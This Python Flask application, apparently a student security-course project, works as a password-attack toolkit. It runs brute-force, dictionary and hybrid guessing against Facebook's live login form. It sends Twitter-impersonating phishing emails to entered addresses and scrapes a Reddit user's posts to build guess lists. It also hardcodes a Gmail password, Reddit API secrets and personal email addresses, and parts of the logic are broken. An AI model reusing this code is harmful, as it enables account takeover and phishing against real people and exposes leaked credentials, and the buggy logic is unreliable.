import mechanize
import praw
import datetime as dt
from passwordchecker import *
import sqlite3
import requests, smtplib, ssl
from flask import Flask, render_template, request
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from collections import Counter
app = Flask(__name__)
@app.errorhandler(500)
def internal_service_error_bf(e):
    return render_template('500_bf.html'), 500
@app.route('/')
def home():
    return render_template('index.html')
@app.route('/bruteforce')
def bruteforce():
    return render_template('bruteforce.html')
@app.route('/hybrid')
def hybrid():
    con = sqlite3.connect("passwords1.db")
    con.row_factory = sqlite3.Row
    cur = con.cursor()
    cur.execute("select * from PASSWORDS")
    rows = cur.fetchall()
    return render_template('hybrid.html', rows = rows)
@app.route('/dictionary')
def dictionary():
    con = sqlite3.connect("passwords1.db")
    con.row_factory = sqlite3.Row
    cur = con.cursor()
    cur.execute("select * from PASSWORDS")
    rows = cur.fetchall()
    return render_template('dictionary.html', rows = rows)

# def findthings():

@app.route('/passwordstrengthchecker')
def passwordstrengthchecker():
    return render_template('passwordstrengthchecker.html')
@app.route('/run_hybrid', methods = ['POST', 'GET'])
def hybrid_alg():
    username = request.form["accusername"]
    dictionaryChunk = request.form["dictionary"]
    dictionary = dictionaryChunk.split()
    i = 0;
    while i < len(dictionary) and  password != None:
        firstword = dictionary[i]
        j = i + 1;
        while j < len(dictionary):
            secondword = dictionary[j]
            comboword = firstword + secondword

            if 's' in comboword:
                comboword.replace('s', '$')
            if 'e' in comboword:
                comboword.replace('e', '3')
            if 'l' in comboword:
                comboword.replace('l', '1')
            if 'a' in comboword:
                comboword.replace('a', '@')
            if 'o' in comboword:
                comboword.replace('o', '0')


            found = facebook_form_filler(username, comboword)
            if found:
                password = comboword
                break

            j = j+1
        i = i +1
    if password != None:
        return render_template('result.html', username = "tarabite@yahoo.com", password = password)
    else:
        return render_template('500_bf.html')
@app.route('/phising')
def phising():
    return render_template('phising.html')
@app.route('/run_brute_force', methods = ['POST','GET'])
def brute_force_alg():
    #username, website, passwordlength, lengthparam, charset
    minpasswordlength = request.form['passwordlength1']
    maxpasswordlength = request.form['passwordlength2']
    username = request.form['accusername']
    charset = request.form['charset']
    website = request.form['website']
    for x in range(int(minpasswordlength),int(maxpasswordlength)+1):
        password = generate(username,charset,x,"")
        #print("username = "+username+"password = "+password)
        #if(facebook_form_filler(username, "gobuckeyes")):
    print("YOUR FOUND PASSWORD IS:    "+password)
    if password is None:
        return render_template('500_bf.html')
    else:
        return render_template('result.html', username = username, password = password)
    #return render_template('bruteforce.html')
def generate(username, charset, length, word):
    if length==0:
        print(word)
        worked = facebook_form_filler(username, word)
        print(username)
        print(worked)
        if worked:
            print("found it")
            return word
        else:
            return None
        #print(word)
    for i in range(len(charset)):
        appended = word + charset[i]
        #print(appended)
        newword = generate(username, charset, length-1,appended)
        if newword != None:
            return newword
    return None
# methods for the dictionary algorithm
@app.route('/run_dictionary', methods = ['POST', 'GET'])
def dictionary_alg():
    username = request.form["accusername"]
    dictionaryChunk = request.form["dictionary"]
    dictionary = dictionaryChunk.split()
    for word in dictionary:
        print(word+"jh")
        found = facebook_form_filler(username, word)
        print(found)
        if found:
            print("found!!!!!!!!!!!!!!")
            password = word
            break
    if password != None:
        return render_template('result.html', username = "tarabite@yahoo.com", password = password)
    else:
        return render_template('500_bf.html')

@app.route('/run_passwordstrengthchecker', methods = ['POST', 'GET'])
def passwordchecker_alg():

    password = request.form["password"]
    passwordChecker = PasswordChecker()
    result = passwordChecker.check_password(password)
    print(result)
    if(result==0 or result==1):
        return render_template('veryweak.html')
    elif(result==2):
        return render_template('weak.html')
    elif (result == 3 or result == 4):
        return render_template('medium.html')
    elif (result == 5):
        return render_template('strong.html')
    elif (result == 6):
        return render_template('verystrong.html')
    else:
        return render_template('password_checker_error.html')

    return render_template('passwordstrengthchecker.html')
@app.route('/run_phising', methods = ['POST','GET'])
def phising_alg():
    # Create message container - the correct MIME type is multipart/alternative here!
    MESSAGE = MIMEMultipart('alternative')
    MESSAGE['subject'] = "URGENT: PASSWORD COMPROMISED"
    MESSAGE['To'] = request.form["accusername"]
    MESSAGE['From'] = "actualnotfaketwitter@gmail.com"
    BODY = """
    <p>Valued User,</p>
    <p>We have detected suspicious activity on you're account. Use the link below to reset your password to avoid having your data compromised.</p><p><a href='https://bit.ly/2IfdmqE'>Twitter Login - Password Reset</a> </p>
    """
    # Record the MIME type text/html
    HTML_BODY = MIMEText(BODY, 'html')

    # Attach parts into message container.
    # According to RFC 2046, the last part of a multipart message, in this case
    # the HTML message, is best and preferred.
    MESSAGE.attach(HTML_BODY)

    # The actual sending of the e-mail
    server = smtplib.SMTP('smtp.gmail.com:587')

    # Print debugging output when testing
    if __name__ == "__main__":
        server.set_debuglevel(1)

    # Credentials (if needed) for sending the mail
    password = "g0buckeyes"

    server.starttls()
    server.login("actualnotfaketwitter@gmail.com",password)
    server.sendmail("actualnotfaketwitter@gmail.com", [request.form["accusername"]], MESSAGE.as_string())
    server.quit()
    # receiver_email = request.form["accusername"]
    # port = 587  # For starttls
    # smtp_server = "smtp.gmail.com"
    # sender_email = "actualnotfaketwitter@gmail.com"
    # password = "g0buckeyes"
    # SUBJECT = "URGENT: PASSWORD COMPROMISED"
    # TEXT = "Valued User,\n\nWe have detected suspicious activity on you're account. Use the link below to reset your password to avoid having your data compromised.\n\n<a href='https://bit.ly/2IfdmqE'>Twitter Login - Password Reset</a>"
    # msg = MIMEText(TEXT ,'html')
    # message = 'Subject: {}\n\n{}'.format(SUBJECT, msg)
    # context = ssl.create_default_context()
    # with smtplib.SMTP(smtp_server, port) as server:
    #     server.ehlo()  # Can be omitted
    #     server.starttls(context=context)
    #     server.ehlo()  # Can be omitted
    #     server.login(sender_email, password)
    #     server.sendmail(sender_email, receiver_email, message)

    print("sent")
    return render_template('emailsent.html')


# fill the form for facebook profiles
def facebook_form_filler(email, password):
    br = mechanize.Browser()
    #br.set_all_readonly(False)    # allow everything to be written to
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://www.facebook.com")
    br.form = list(br.forms())[0]
    br.form.set_all_readonly(False)
    br.form['email'] = email
    br.form['pass'] = password
    result = br.submit(id='u_0_2')
    print(result.geturl())
    return result.geturl() == "https://www.facebook.com/"
def facebook_form_filler1(email, password):
    br = mechanize.Browser()
    #br.set_all_readonly(False)    # allow everything to be written to
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://www.facebook.com/login")
    br.form = list(br.forms())[0]
    br.form.set_all_readonly(False)
    br.form['email'] = email
    br.form['pass'] = password
    result = br.submit(id='loginbutton')
    print(result.geturl())
    return result.geturl() == "https://www.facebook.com/"
# fill the form for yahoo profiles
def yahoo_form_filler(email, password):
    br = mechanize.Browser()
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com")
    br.form = list(br.forms())[0]
    # for control in br.form.controls:
    #     print(control)
    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))
    br.form['username'] = email
    result = br.submit(id = 'login-signin')
    print(result)
    print(result.geturl())
    response1 = br.open(result.geturl())
    # br.form = list(br.forms())[0]
    # for control in br.form.controls:
    #     print(control)
    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))

@app.route('/redditscrape')
def redditscrape():
    return render_template('redditscrape.html')

@app.route('/run_redditscraper', methods = ['POST','GET'])
def run_redditscraper():
    # return render_template('errorpage.html')
    username = request.form["username"]
    commentnum = request.form["commentnum"]
    subnum = request.form["subnum"]
    str_topcomm = request.form["str_topcomm"]
    str_topsub = request.form["str_topsub"]
    # set up reddit login
    reddit = praw.Reddit(client_id='qIv6ZQYkFNpvAQ', \
                         client_secret='IkWl2ulNzZrTpBjCQipQzskq-9A', \
                         user_agent='passwordcracker', \
                         username='pwcracker_throwaway', \
                         password='cse447112!')
    # find the most common words in comments and submissions
    # find all the comments the user wants
    comment_words = []
    comments = []
    int_comm = int(commentnum)
    num_topcomm = int(str_topcomm)
    num_topsub = int(str_topsub)
    for comment in reddit.redditor(username).comments.new(limit=int_comm):
        comments.append(comment.body)
        words = comment.body.split()
        for word in words:
            comment_words.append(word)
        #.split('\n', 1)[0][:200])
    comm_counts = Counter(comment_words)
    top_countcomm = comm_counts.most_common(num_topcomm)
    top_countcommlen = len(top_countcomm)
    # print(submission.url)    # Output: the URL the submission points to
    #                          # or the submission's URL if it's a self post
    # find all the submissions the user wants
    submissions = []
    sub_words = []
    int_sub = int(subnum)
    for topsub in reddit.redditor(username).submissions.top('all', limit=int_sub):
        submissions.append(topsub.title)
        words = topsub.title.split()
        for word in words:
            sub_words.append(word)
    sub_counts = Counter(sub_words)
    top_countsub = sub_counts.most_common(num_topsub)
    top_countsublen = len(top_countsub)
    return render_template('scrape_data.html', username=username, comments=comments, submissions=submissions, int_comm=int_comm, int_sub=int_sub, top_countcommlen=top_countcommlen, top_countcomm=top_countcomm, top_countsublen=top_countsublen, top_countsub=top_countsub)

print(facebook_form_filler("tarabite1998@gmail.com","ggggggoo"))
#instagram_form_filler("tarabite@yahoo.com","gobuckeyes")
#print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
#yahoo_form_filler("tarabite@yahoo.com","gobuckeyes")
